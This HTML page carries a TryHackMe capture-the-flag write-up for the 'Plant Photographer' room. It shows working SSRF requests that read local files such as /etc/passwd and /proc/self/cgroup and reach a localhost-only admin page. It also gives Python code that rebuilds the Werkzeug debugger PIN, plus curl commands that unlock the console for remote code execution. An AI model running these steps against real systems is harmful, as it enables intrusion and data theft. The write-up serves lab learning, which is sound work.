@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plant Photographer // writeup</title>
+    <meta name="description" content="Discovery and a logic flaw in the Plant Photographer application, walked through from first request to captured flag.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Plant Photographer</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-easy">Easy</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-13</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Easy</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> plant-photographer-writeup.md</span>
+                </div>
+                <p class="writeup-summary">Discovery and a logic flaw in the Plant Photographer application, walked through from first request to captured flag.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/plant-photographer-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="plant-photographer-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>Walkthrough</h1>
+<h3>PlatformTryHackMe CategoryWeb / Exploitation DifficultyMedium Room Plant Photographer Target IP10.49.139.127 OS Linux (Docker container) TL;DR — A custom Flask portfolio site hides a pycurl-based downloader that is a classic SSRF. We abuse it to (1) read the source code, (2) hit a localhost-only admin page, and (3) pull every ingredient needed to crack the Werkzeug debugger PIN and achieve RCE, finally reading the root flag. Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos: http://IP/. Proud of building the site himself from scratch, he&#39;s asked you to take a quick look and let him know if anything could be improved. Look closely at how the site works under the hood, and determine whether it was coded with best practices in mind. If you find anything questionable, dig deeper and try to uncover the flag hidden behind the scenes.</h3>
+<h1>2. Reconnaissance — Nmap</h1>
+<h3>We start with a full port scan and a service/version scan on the live host:</h3>
+<p>nmap -p- -Pn 10.49.139.127 --min-rate 1000 -oN nmap_ports.txt nmap -Pn 10.49.139.127 -sV -sC -oN nmap_sC.txt</p>
+<h3>Result:</h3>
+<p>PORT     STATE    SERVICE 22/tcp   open     ssh 80/tcp   open     http 8083/tcp filtered us-srv</p>
+<h3>Only SSH and a web server are reachable. A quick look at the response headers tells us everything we need:</h3>
+<p>HTTP/1.0 200 OK Server: Werkzeug/0.16.0 Python/3.10.7</p>
+<h3>This is a Python/Flask application (Werkzeug WSGI server). Two things immediately stand out: Werkzeug is very old (0.16.0). • Flask apps with debug=True expose the Werkzeug interactive debugger, which is a known • RCE vector if you can recover the debugger PIN.</h3>
+<h1>3. Web Enumeration — ffuf</h1>
+<h3>Let&#39;s hunt for hidden paths and extensions:</h3>
+<p>ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.49.139.127/FUZZ -mc 200,301,302,403</p>
+<h3>Result:</h3>
+<p>admin console download</p>
+<h3>Three interesting endpoints: EndpointWhat it shows Returns 404/blocked when hit from outside The Werkzeug debugger interactive console (locked with a PIN) Downloads the &quot;resume&quot; PDF — No file selected... On the homepage the &quot;Download Resume&quot; button links to: The server and id parameters are fully user-controlled.</h3>
+<h1>4. The SSRF in /download</h1>
+<h3>The /download endpoint takes a server and id value, builds a URL, and fetches it for us. That is the textbook definition of a Server-Side Request Forgery (SSRF): the server makes a request on our behalf, • and we control where it connects (host + port + scheme). • We can point server at a file:// URL and read arbitrary local files, because the backend never validates the protocol:</h3>
+<p>curl &quot;http://10.49.139.127/download?server=file:///usr/src/app/app.py%23&amp;id=75482342&quot; -o app.py</p>
+<h3>Note the %23 (#): the app appends /public-docs-k057230990384293/&lt;id&gt;.pdf to whatever we pass, so the # comments out the appended path and lets us read the raw file. We just pulled the application source code:</h3>
+<p>import os import pycurl from io import BytesIO from flask import Flask, send_from_directory, render_template, request, redirect, url_for, Response app = Flask(<strong>name</strong>, static_url_path=&#39;/static&#39;) @app.route(&quot;/&quot;) def index(): return render_template(&quot;index.html&quot;) @app.route(&quot;/admin&quot;) def admin(): if request.remote_addr == &#39;127.0.0.1&#39;: return send_from_directory(&#39;private-docs&#39;, &#39;flag.pdf&#39;) return &quot;Admin interface only available from localhost!!!&quot; @app.route(&quot;/download&quot;) def download(): file_id = request.args.get(&#39;id&#39;,&#39;&#39;) server = request.args.get(&#39;server&#39;,&#39;&#39;) if file_id!=&#39;&#39;: filename = str(int(file_id)) + &#39;.pdf&#39; response_buf = BytesIO() crl = pycurl.Curl() crl.setopt(crl.URL, server + &#39;/public-docs-k057230990384293/&#39; + filename) crl.setopt(crl.WRITEDATA, response_buf) crl.setopt(crl.HTTPHEADER, [&#39;X-API-KEY: THM{Hello_Im_just_an_API_key}&#39;]) crl.perform() crl.close() file_data = response_buf.getvalue() resp = Response(file_data) resp.headers[&#39;Content-Type&#39;] = &#39;application/pdf&#39; resp.headers[&#39;Content-Disposition&#39;] = &#39;attachment&#39;</p>
+<p>return resp else: return &#39;No file selected... &#39; @app.route(&#39;/public-docs-k057230990384293/&lt;path:path&gt;&#39;) def public_docs(path): return send_from_directory(&#39;public-docs&#39;, path) if <strong>name</strong> == &quot;<strong>main</strong>&quot;: app.run(host=&#39;0.0.0.0&#39;, port=8087, debug=True)</p>
+<h3>The source reveals three big things: 1.A hardcoded API key header — this is the first flag. 2./admin only serves flag.pdf when the request comes from 127.0.0.1. 3.The app runs with debug=True on port 8087 — the Werkzeug debugger is active.</h3>
+<h1>5. Flag 1 — API Key in Source</h1>
+<p>X-API-KEY: THM{Hello_Im_just_an_API_key}</p>
+<h3>Flag 1 — 🏳️</h3>
+<h1>6. Flag 2 — Localhost-Only Admin via SSRF</h1>
+<h3>The /admin page checks request.remote_addr == &#39;127.0.0.1&#39;. We can&#39;t spoof that from our client, but we can make the server itself request it — from localhost — using the SSRF:</h3>
+<p>curl &quot;http://10.49.139.127/download?server=http://localhost:8087/admin%23&amp;id=75482342&quot; -o flag.pdf</p>
+<h3>The %23 truncates the appended /public-docs-.../75482342.pdf, so the backend calls http://localhost:8087/admin#... — from 127.0.0.1 — and happily returns flag.pdf. The PDF text is encoded with a custom font, but a simple extraction reveals the flag:</h3>
+<p>pdftotext flag.pdf - The flag is thm{c4n_i_haz_flagz_plz?}</p>
+<h3>Flag 2 — 🏳️</h3>
+<h1>7. Revisiting the Debugger — /console</h1>
+<h3>We know the app runs with debug=True, and the /console page hosts the Werkzeug interactive console: It gives us ✅ arbitrary Python execution (RCE). • It requires a ❌ PIN to unlock. • Werkzeug generates the PIN from a handful of &quot;system secrets&quot; that are guessable if we can read a few files on the machine. And we have a perfect file-read primitive (the SSRF!). The debugger page also leaks the SECRET used to sign debugger commands:</h3>
+<p>var TRACEBACK = -1, CONSOLE_MODE = true, EVALEX = true, EVALEX_TRUSTED = false, SECRET = &quot;sk0BElEVOwaC9l8ew1Wm&quot;;</p>
+<h3>To be 100% accurate about the algorithm, we read the actual Werkzeug source that is running on the target (it ships with a custom salt!):</h3>
+<p>curl &quot;http://10.49.139.127/download?server=file:///usr/local/lib/python3.10/site-packages/ werkzeug/debug/<strong>init</strong>.py%23&amp;id=75482342&quot; -o debug.py</p>
+<h3>Key parts of get_pin_and_cookie_name():</h3>
+<p>probably_public_bits = [ username,                                  # OS user running the app modname,                                   # &quot;flask.app&quot; app.<strong>name</strong>,                              # &quot;Flask&quot; mod.<strong>file</strong>,                              # path to flask/app.py ] private_bits = [ str(uuid.getnode()),                       # MAC address as integer string get_machine_id(),                          # machine-id / boot-id / docker cgroup ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): ... h.update(b&quot;cookiesalt&quot;)                        # cookie name h.update(b&quot;pinsalt&quot;)                           # pin</p>
+<h3>We also notice the challenge version has a custom salt in hash_pin():</h3>
+<p>def hash_pin(pin): return hashlib.md5(pin + b&quot;shittysalt&quot;).hexdigest()[:12]</p>
+<h1>8. Gathering the PIN Ingredients via SSRF</h1>
+<h2>8.1 Username — /etc/passwd</h2>
+<p>curl &quot;http://10.49.139.127/download?server=file:///etc/passwd%23&amp;id=75482342&quot;</p>
+<h3>The app runs as root (Alpine /bin/ash).</h3>
+<h2>8.2 Module path — flask/app.py</h2>
+<h3>From the Werkzeug traceback earlier:</h3>
+<p>File &quot;/usr/local/lib/python3.10/site-packages/flask/app.py&quot;</p>
+<h2>8.3 MAC address</h2>
+<p>curl &quot;http://10.49.139.127/download?server=file:///sys/class/net/eth0/address%23&amp;id=75482342&quot; 02:42:ac:14:00:02</p>
+<h3>→ int(&quot;0242ac140002&quot;, 16) = 2485378088962</h3>
+<h2>8.4 Machine ID — Docker container</h2>
+<h3>/etc/machine-id does not exist in the container, and Werkzeug&#39;s get_machine_id() reads the first line of the cgroup file to grab the Docker container ID:</h3>
+<p>curl &quot;http://10.49.139.127/download?server=file:///proc/self/cgroup%23&amp;id=75482342&quot; 12:hugetlb:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca ...</p>
+<h3>→ machine_id = 77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca</h3>
+<h2>8.5 Summary table</h2>
+<h3>Ingredient Value</h3>
+<p>username root modname flask.app appname Flask mod.<strong>file</strong> /usr/local/lib/python3.10/site-packages/flask/app.py</p>
+<h3>MAC (uuid.getnode())02:42:ac:14:00:02 → 2485378088962</h3>
+<p>get_machine_id() 77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049c</p>
+<h3>Ingredient Value</h3>
+<h1>9. Calculating the PIN</h1>
+<h3>Now we replicate Werkzeug&#39;s exact PIN algorithm with the values above:</h3>
+<p>import hashlib from itertools import chain probably_public_bits = [ &quot;root&quot;,                                            # username &quot;flask.app&quot;,                                       # modname &quot;Flask&quot;,                                           # app name &quot;/usr/local/lib/python3.10/site-packages/flask/app.py&quot;,  # mod.<strong>file</strong> ] private_bits = [ str(int(&quot;0242ac140002&quot;, 16)),                      # MAC as int string &quot;77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca&quot;, ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&quot;utf-8&quot;) h.update(bit) h.update(b&quot;cookiesalt&quot;) cookie_name = &quot;<strong>wzd&quot; + h.hexdigest()[:20]             # </strong>wzd85a5ff2ddeee0c7a9138 h.update(b&quot;pinsalt&quot;) num = (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9] pin = &quot;-&quot;.join(num[i:i+3] for i in range(0, len(num), 3)) print(&quot;cookie:&quot;, cookie_name) print(&quot;PIN:&quot;, pin)</p>
+<h3>Result:</h3>
+<p>cookie: __wzd85a5ff2ddeee0c7a9138 PIN: 110-688-511</p>
+<h1>10. RCE — Unlocking the Console</h1>
+<h2>10.1 Authenticate with the PIN</h2>
+<h3>The debugger exposes a pinauth command. On success it hands us a trusted cookie:</h3>
+<p>SECRET=&quot;sk0BElEVOwaC9l8ew1Wm&quot; curl &quot;http://10.49.139.127/console?<strong>debugger</strong>=yes&amp;cmd=pinauth&amp;s=$SECRET&amp;pin=110-688-511&quot; {&quot;auth&quot;: true, &quot;exhausted&quot;: false} Set-Cookie: __wzd85a5ff2ddeee0c7a9138=1786610880|aa2032ed69d3</p>
+<h2>10.2 Execute code</h2>
+<h3>The interactive console submits the code itself in the cmd parameter:</h3>
+<p>COOKIE=&quot;<strong>wzd85a5ff2ddeee0c7a9138=1786610880|aa2032ed69d3&quot; curl -b &quot;$COOKIE&quot; -G &quot;http://10.49.139.127/console&quot; \ --data-urlencode &quot;</strong>debugger<strong>=yes&quot; \ --data-urlencode &quot;cmd=</strong>import__(&#39;os&#39;).listdir(&#39;/usr/src/app&#39;)&quot; \ --data-urlencode &quot;frm=0&quot; --data-urlencode &quot;s=$SECRET&quot;</p>
+<pre class="code-block" data-lang="bash"><code>&gt;&gt;&gt; __import__(&#39;os&#39;).listdir(&#39;/usr/src/app&#39;)
+[&#39;requirements.txt&#39;, &#39;Dockerfile&#39;, &#39;templates&#39;, &#39;public-docs&#39;,</code></pre>
+<p>&#39;private-docs&#39;, &#39;static&#39;, &#39;app.py&#39;, &#39;flag-982374827648721338.txt&#39;]</p>
+<h3>There it is — flag-982374827648721338.txt sitting right next to the source.</h3>
+<h1>11. Final Flag</h1>
+<p>curl -b &quot;$COOKIE&quot; -G &quot;http://10.49.139.127/console&quot; \ --data-urlencode &quot;<strong>debugger</strong>=yes&quot; \ --data-urlencode &quot;cmd=open(&#39;/usr/src/app/flag-982374827648721338.txt&#39;).read()&quot; \ --data-urlencode &quot;frm=0&quot; --data-urlencode &quot;s=$SECRET&quot;</p>
+<pre class="code-block" data-lang="bash"><code>&gt;&gt;&gt; open(&#39;/usr/src/app/flag-982374827648721338.txt&#39;).read()</code></pre>
+<h3>Final Flag — 🏆</h3>
+<h1>12. Bonus — The Debug Cookie</h1>
+<h3>Once authenticated, the server issued the trusted debugger cookie:</h3>
+<p>__wzd85a5ff2ddeee0c7a9138 = &lt;unix_timestamp&gt;|&lt;hash&gt;</p>
+<h3>The value is timestamp|hash_pin(pin) where hash_pin is the salted md5:</h3>
+<p>hash_pin(&quot;110-688-511&quot;)  # md5(pin + b&quot;shittysalt&quot;)[:12]</p>
+<h3>It keeps the debugger session &quot;trusted&quot; for up to 7 days (PIN_TIME) so the browser doesn&#39;t have to re-enter the PIN on every command.</h3>
+<h1>13. Flags Summary</h1>
+<h3>#Flag 1 2 3</h3>
+<h1>14. Key Takeaways</h1>
+<h3>1.SSRF is never just &quot;localhost access&quot; — the same primitive gave us file read, an admin bypass, and all the data needed for the debugger PIN. 2.file:// + # truncation is a neat trick when the backend blindly concatenates a path. 3.Never expose Werkzeug debug mode in production.debug=True is instant RCE the moment the PIN ingredients leak. 4.The Werkzeug debugger PIN is predictable — it&#39;s a salted hash of username, module path, MAC, and machine-id, so an attacker who can read a handful of /proc and /sys files can fully reconstruct it. 5.Read tracebacks carefully — they leak absolute paths (/usr/local/lib/python3.10/...) that make PIN reconstruction trivial.</h3>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/plant-photographer-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="plant-photographer-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
